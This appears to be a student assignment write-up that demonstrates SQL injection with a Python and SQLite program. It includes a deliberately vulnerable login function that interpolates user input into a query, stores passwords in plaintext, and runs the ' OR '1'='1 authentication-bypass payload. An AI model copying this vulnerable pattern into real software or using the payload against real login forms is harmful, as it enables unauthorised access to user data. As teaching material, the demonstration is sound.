# Part 1 - A27: Research and Implement a System Vulnerability

### System Vulnerability: SQL Injection
SQL injection is a vulnerability that allows attackers to interfere with a web application's database queries. By inserting malicious SQL code into input fields, attackers can bypass security, view, modify, or delete sensitive data, and sometimes gain full control over the database. 

**Implementation**
To demonstrate this vulnerability I created the following program.

Step 1. Database Creation
```python
def setup_database(conn):
    cursor = conn.cursor()

    # Create a 'users' table with username and password columns
    cursor.execute("""
        CREATE TABLE users (
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)

    # Insert two users into the table
    cursor.executemany(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        [
            ("lewis", "secretpassword"),
            ("hamilton",   "moresecretpassword"),
        ],
    )

    # Save the changes to the database
    conn.commit()
    print("Database created with 2 users.\n")
```

Step 2. Vulnerability Implementation
```python
def vulnerable_login(conn, username: str, password: str):
    # Vulnerability: user input is directly inserted into the SQL string.
    # An attacker can break out of the string using a single quote (') and inject their own SQL logic
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

    print(f"Query: {query}")

    cursor = conn.cursor()

    # Executes query (dangerous)
    cursor.execute(query)

    return cursor.fetchone()
```

Step 3. SQL Injection
- Shows a normal unsuccessful login and a SQL injection
```python
conn = sqlite3.connect("Database")
setup_database(conn)

# A normal login attmpt where access is denied
print("Normal login attempt")
row = vulnerable_login(conn, "lewis", "incorrectpassword")
print(f"Result: {row}\n")

# SQL Injection bypass
# Injects ' OR '1'='1
print("--- SQL Injection bypass ---")
row = vulnerable_login(conn, "' OR '1'='1", "' OR '1'='1")
if row:
    print(f"Bypassed! Logged in as: username={row[0]}")

conn.close()
```
- This works because the query requires both username and password to match, but the OR '1'='1' part adds a condition that is always true, which overrides the rest of the logic. Since OR only needs one side to be true, the database ignores the failed username/password check and returns a row anyway.

**Program Output**
<img width="1440" height="900" alt="Screenshot 2026-03-24 at 2 34 51 pm" src="https://github.com/user-attachments/assets/aa648dc8-fe90-4f2f-9ee0-a1326d024b68" />
